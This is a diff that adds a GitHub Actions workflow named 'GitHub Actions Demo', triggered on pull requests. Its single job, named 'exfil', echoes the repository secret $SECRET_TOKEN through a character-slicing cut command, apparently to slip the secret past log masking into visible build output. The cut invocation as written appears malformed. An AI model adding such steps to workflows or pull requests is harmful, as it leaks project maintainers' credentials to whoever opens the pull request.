@@ -1,0 +1,8 @@
+name: GitHub Actions Demo
+on: [pull_request]
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo $SECRET_TOKEN | cut -d"f" -c2
